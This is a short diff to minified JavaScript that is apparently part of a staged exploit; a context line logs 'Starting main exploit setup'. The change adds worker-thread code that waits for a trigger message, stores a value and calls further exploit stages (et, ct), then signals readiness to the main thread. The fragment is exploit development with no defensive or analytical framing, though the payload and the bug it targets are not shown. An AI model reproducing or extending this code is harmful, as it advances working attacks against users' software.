@@ -1500,9 +1500,21 @@ async function q(t, e) {
     window.log("[STAGE1] >>> Starting main exploit setup (ht)");
     ht(t);
   } else {
-    // Worker thread code - stringified q() will execute here
-    // The q() function checks navigator.constructor.name and takes this branch in worker
-    // It should send worker_started initially, then worker_ready after setting onmessage
+    // Worker thread code
+    try {
+      self.onmessage = (t) => {
+        if (t.data.type === s) {
+          l = t.data.xn;
+          et();
+          ct();
+        }
+      };
+      self.postMessage({ type: 0, msg: "worker_ready" });
+    } catch (err) {
+      try {
+        self.postMessage({ type: 0, msg: "worker_else_error: " + err.message });
+      } catch(e) {}
+    }
   }
 }
 async function X() {
